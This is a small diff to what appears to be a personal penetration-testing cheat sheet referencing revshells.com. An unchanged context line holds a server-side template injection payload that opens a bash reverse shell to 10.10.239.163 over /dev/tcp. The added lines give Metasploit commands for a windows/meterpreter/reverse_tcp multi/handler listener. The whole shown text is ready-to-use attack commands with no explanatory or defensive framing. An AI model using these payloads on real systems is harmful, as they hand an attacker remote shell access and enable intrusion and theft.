@@ -10,3 +10,14 @@ url: "https://www.revshells.com/"
 {{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
 ```
 
+Start meterpreter listener Kali MSF
+#rev_shell
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST
+set LPORT
+
+exploit
+```
